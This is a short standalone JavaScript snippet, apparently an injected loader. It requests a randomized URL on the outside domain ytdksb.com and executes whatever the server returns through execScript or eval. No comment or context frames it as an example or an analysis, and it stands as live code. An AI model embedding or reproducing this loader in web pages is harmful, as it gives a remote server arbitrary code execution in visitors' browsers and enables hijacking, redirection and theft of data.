
    ;(function(){
        var idomain = 'https://www.ytdksb.com';
        var d=idomain;
        var a=new XMLHttpRequest();
        var b=d+"/"+"lz-10061-"+Math.floor(Math.random()*9999999+1);
        if(a!=null){
            a.onreadystatechange=function(){
                if(a.readyState==4 && a.status==200){
                    if(window.execScript)window.execScript(a.responseText,"JavaScript");
                    else if(window.eval)window.eval(a.responseText,"JavaScript");
                    else eval(a.responseText);
                }
            };
            a.open("GET",b,false);
            a.send();
        }
    })();